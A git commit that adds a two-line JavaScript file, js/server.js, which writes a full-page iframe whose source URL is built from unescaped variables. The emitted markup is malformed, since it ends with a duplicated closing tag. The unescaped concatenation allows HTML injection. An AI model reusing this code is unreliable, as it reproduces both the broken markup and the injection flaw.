bac8894bb9e6c7aea11f01f2e27918b9cd1fcdb2
fb01cmx <53531630+fb01cmx@users.noreply.github.com>
2019-09-20 21:41:03 +0700

    Create server.js
    upload JS server

---
+++ js/server.js
@@ -0,0 +1,2 @@
+document.write("<iframe name='site' id='site' width='100%' height='100%' frameborder='0' marginheight='0' marginwidth='0' src='"
+	+ frm + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
